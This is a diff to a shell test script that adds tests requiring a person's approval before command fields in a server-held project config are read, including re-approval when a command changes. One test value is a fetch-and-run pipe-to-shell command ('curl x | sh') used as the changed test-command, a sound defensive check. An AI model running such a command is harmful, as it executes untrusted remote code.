@@ -222,6 +222,40 @@ echo '{"framing":"x","data":{}}' > "$STUB_DIR/config.json"
 srv hero_config_exists "$APP"; check "config: a project with no config there reads as no config" "1" "$?"
 srv hero_field default-branch "$APP" >/dev/null 2>&1; check "config: and a field of it is absent (rc 1)" "1" "$?"
 
+# ---------- command fields need a person's approval -------------------------------
+
+# A server-held HERO.md is editable in the app; a command field in it runs in
+# the person's shell, so it is not read until a person approved it.
+cmd_cfg() { # TEST_COMMAND PORT
+  jq -n --arg m "$(printf '## Repository\n\n- default-branch: main\n- task-runner: just\n\n## Projects\n\n### api\n\n- path: .\n- port: %s\n- test-command: %s\n- dev-command: npm run dev\n' "$2" "$1")" '{framing: "x", data: {exists: true, markdown: $m}}' > "$STUB_DIR/config.json"
+}
+APPROVALS="$XDG_CONFIG_HOME/wayfare/approved-commands"
+rm -rf "$APPROVALS"
+cmd_cfg "npm test" 3000
+srv hero_field default-branch "$APP" >/dev/null 2>&1; check "commands: a first read of unapproved command fields is rc 3" "3" "$?"
+srv hero_config_show "$APP" >/dev/null 2>&1; check "commands: and show is rc 3, not the generic 2" "3" "$?"
+srv hero_config_exists "$APP" >/dev/null 2>&1; check "commands: and exists is rc 3" "3" "$?"
+srv hero_connection issues type "$APP" >/dev/null 2>&1; check "commands: and a connection read is rc 3" "3" "$?"
+ERR=$(srv hero_field default-branch "$APP" 2>&1 >/dev/null)
+case "$ERR" in *"task-runner: just"*"test-command: npm test"*"dev-command: npm run dev"*) check "commands: stderr names every command field" ok ok ;; *) check "commands: stderr names every command field" ok "$ERR" ;; esac
+check "commands: nothing is approved by reading" "no" "$([ -e "$APPROVALS" ] && echo yes || echo no)"
+srv hero_srv_commands_approve "$APP"; check "commands: approve succeeds" "0" "$?"
+check "commands: the record is mode 600" "600" "$(stat -f %Lp "$APPROVALS"/* 2>/dev/null || stat -c %a "$APPROVALS"/*)"
+check "commands: the same config now reads" "main" "$(srv hero_field default-branch "$APP")"
+cmd_cfg "npm test" 4000
+check "commands: a non-command field changing still reads" "main" "$(srv hero_field default-branch "$APP")"
+cmd_cfg "curl x | sh" 3000
+srv hero_field default-branch "$APP" >/dev/null 2>&1; check "commands: a changed test-command is unapproved again" "3" "$?"
+ERR=$(srv hero_field default-branch "$APP" 2>&1 >/dev/null)
+case "$ERR" in *"changed or new: [api] test-command: curl x | sh"*"was approved: [api] test-command: npm test"*) check "commands: stderr shows old and new" ok ok ;; *) check "commands: stderr shows old and new" ok "$ERR" ;; esac
+srv hero_srv_commands_approve "$APP"
+check "commands: approving the change lets it read" "main" "$(srv hero_field default-branch "$APP")"
+echo '{"framing":"x","data":{}}' > "$STUB_DIR/config.json"
+srv hero_config_exists "$APP"; check "commands: a project with no config needs no approval" "1" "$?"
+# The local backend is unchanged.
+check "commands: local reads never ask" "main" "$(hero_field default-branch "$APP")"
+cmd_cfg "npm test" 3000
+
 # ---------- fleet rows ----------------------------------------------------------
 
 reset
